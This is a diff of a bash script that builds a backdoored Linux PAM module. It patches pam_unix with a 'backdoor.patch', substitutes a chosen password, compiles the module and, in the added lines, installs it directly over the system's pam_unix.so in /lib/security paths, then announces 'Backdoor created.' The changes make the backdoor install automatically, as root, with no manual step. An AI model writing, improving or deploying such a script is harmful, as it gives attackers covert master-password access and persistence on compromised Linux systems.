@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# [*] MAKE SURE YOU'RE RUNNING AS ROOT, NOT JUST SUDO!
+
 OPTIND=1
 
 PAM_VERSION=
@@ -76,14 +78,16 @@ tar xzf $PAM_FILE
 cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
 cd $PAM_DIR
 # newer version need autogen to generate the configure script
-if [[ ! -f "./configure" ]]; then 
-    ./autogen.sh 
-fi 
-./configure
+# + Fixed compilation error in original code.
+if [[ ! -f "./configure" ]]; then
+    make distclean
+    ./autogen.sh
+fi
+./configure --disable-doc
 make
-cp modules/pam_unix/.libs/pam_unix.so ../
+#cp modules/pam_unix/.libs/pam_unix.so ../
+cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/ || cp modules/pam_unix/.libs/pam_unix.so /lib/security/
 cd ..
 echo "Backdoor created."
-echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
+#echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
 echo ""
-
